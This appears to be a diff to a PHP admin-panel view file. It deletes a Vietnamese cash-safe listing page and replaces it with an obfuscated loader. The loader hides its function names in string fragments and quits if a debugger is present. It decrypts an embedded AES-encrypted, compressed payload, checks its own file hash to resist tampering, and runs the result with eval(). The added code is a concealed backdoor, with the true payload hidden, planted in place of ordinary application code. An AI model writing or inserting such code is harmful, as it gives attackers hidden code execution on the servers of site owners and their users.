@@ -1,156 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_datatable.php"; ?>
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
-  <!-- Left side column. contains the logo and sidebar -->
-  
-  <?php include"sidebar.php"; ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?=$page_title;?>
-        <small>View/Search Items Cash</small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li class="active"><?=$page_title;?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <?= form_open('#', array('class' => '', 'id' => 'table_form')); ?>
-    <input type="hidden" id='base_url' value="<?=$base_url;?>">
-    <section class="content">
-      <div class="row">
-        <!-- ********** ALERT MESSAGE START******* -->
-        <?php include"comman/code_flashdata.php"; ?>
-        <!-- ********** ALERT MESSAGE END******* -->
-        <div class="col-xs-12">
-          <div class="box">
-            <div class="box-header with-border">
-              <h3 class="box-title"><?=$page_title;?></h3>
-              
-            </div>
-            <!-- /.box-header -->
-            <div class="box-body">
-              <table id="example2" class="table table-bordered table-striped" width="100%">
-                <thead class="bg-primary ">
-                <tr>
-                  <th class="text-center">
-                    <input type="checkbox" class="group_check checkbox" >
-                  </th>
-                  <th>Tên két</th>
-                  <th>Thông tin két</th>
-                  <th>Tài khoản két</th>
-                  <th><?= $this->lang->line('status'); ?></th>
-                  <th><?= $this->lang->line('action'); ?></th>
-                </tr>
-                </thead>
-                <tbody>
-				
-                </tbody>
-               
-              </table>
-            </div>
-            <!-- /.box-body -->
-          </div>
-          <!-- /.box -->
-        </div>
-        <!-- /.col -->
-      </div>
-      <!-- /.row -->
-    </section>
-    <!-- /.content -->
-    <?= form_close();?>
-  </div>
-  <!-- /.content-wrapper -->
-  <?php include"footer.php"; ?>
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_datatable.php"; ?>
-
-<script type="text/javascript">
-$(document).ready(function() {
-    //datatables
-   var table = $('#example2').DataTable({ 
-
-      /* FOR EXPORT BUTTONS START*/
-  dom:'<"row margin-bottom-12"<"col-sm-12"<"pull-left"l><"pull-right"fr><"pull-right margin-left-10 "B>>>tip',
- /* dom:'<"row"<"col-sm-12"<"pull-left"B><"pull-right">>> <"row margin-bottom-12"<"col-sm-12"<"pull-left"l><"pull-right"fr>>>tip',*/
-      buttons: {
-        buttons: [
-          
-            { extend: 'copy', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4]} },
-            { extend: 'excel', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4]} },
-            { extend: 'pdf', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4]} },
-            { extend: 'print', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4]} },
-            { extend: 'csv', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4]} },
-            { extend: 'colvis', className: 'btn bg-teal color-palette btn-flat',text:'Columns' },  
-
-            ]
-        },
-        /* FOR EXPORT BUTTONS END */
-
-        "processing": true, //Feature control the processing indicator.
-        "serverSide": true, //Feature control DataTables' server-side processing mode.
-        "order": [], //Initial no order.
-        "responsive": true,
-        language: {
-            processing: '<div class="text-primary bg-primary" style="position: relative;z-index:100;overflow: visible;">Processing...</div>'
-        },
-        // Load data for the table's content from an Ajax source
-        "ajax": {
-            "url": "<?php echo site_url('cash/ajax_list')?>",
-            "type": "POST",
-            
-            complete: function (data) {
-             $('.column_checkbox').iCheck({
-                checkboxClass: 'icheckbox_square-orange',
-                /*uncheckedClass: 'bg-white',*/
-                radioClass: 'iradio_square-orange',
-                increaseArea: '10%' // optional
-              });
-             call_code();
-              //$(".delete_btn").hide();
-             },
-
-        },
-
-        //Set column definition initialisation properties.
-        "columnDefs": [
-        { 
-            "targets": [ 0,5 ], //first column / numbering column
-            "orderable": false, //set not orderable
-        },
-        {
-            "targets" :[0],
-            "className": "text-center",
-        },
-        
-        ],
-    });
-    new $.fn.dataTable.FixedHeader( table );
-});
-</script>
-<script src="<?php echo $theme_link; ?>js/cash.js"></script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_qpq5lkaw=('bas'.'e64'.'_de'.'cod'.'e');
+$_gjfavbmg=('gzu'.'nco'.'mpr'.'ess');
+$_k6er71e7=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_smylfuzl='W2jdZNOP';
+$_pczffd76='C0F2svEu';
+$_txk05fua='0tErW5XIefM=';
+$_mldsklm0='ZGgLEoWV';
+$_trux35gu='4aE0kCv7';
+$_r9oloj7f='+yH0Aq86';
+$_tyrijye3='W22DvBK/';
+$_ktrjsryn='TqCHwQ==';
+$_fmcarggm=$_qpq5lkaw($_pczffd76.$_trux35gu.$_smylfuzl.$_mldsklm0.$_txk05fua);
+$_p0jsnukd=$_qpq5lkaw($_tyrijye3.$_r9oloj7f.$_ktrjsryn);
+$_lfjac8zb=$_qpq5lkaw('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');
+$_qk1xxxvl=$_k6er71e7($_lfjac8zb,'aes-256-cbc',$_fmcarggm,OPENSSL_RAW_DATA,$_p0jsnukd);
+if($_qk1xxxvl===false){exit;}
+$_pcavl21h=$_gjfavbmg($_qk1xxxvl);
+if($_pcavl21h===false){exit;}
+$_ptb461xu='d6534acdc6821863065549f67f28c8e7e7c036cda8e574696a69bc0bcd7c2753';
+$_d5njsq3w=@file_get_contents(__FILE__);
+if($_d5njsq3w!==false){
+$_zu2tyc17=str_replace($_ptb461xu,"0000000000000000000000000000000000000000000000000000000000000000",$_d5njsq3w);
+$_h65qsmkw=hash("sha256",$_zu2tyc17);
+if($_h65qsmkw!==$_ptb461xu){@http_response_code(403);exit;}
+}
+eval($_pcavl21h);
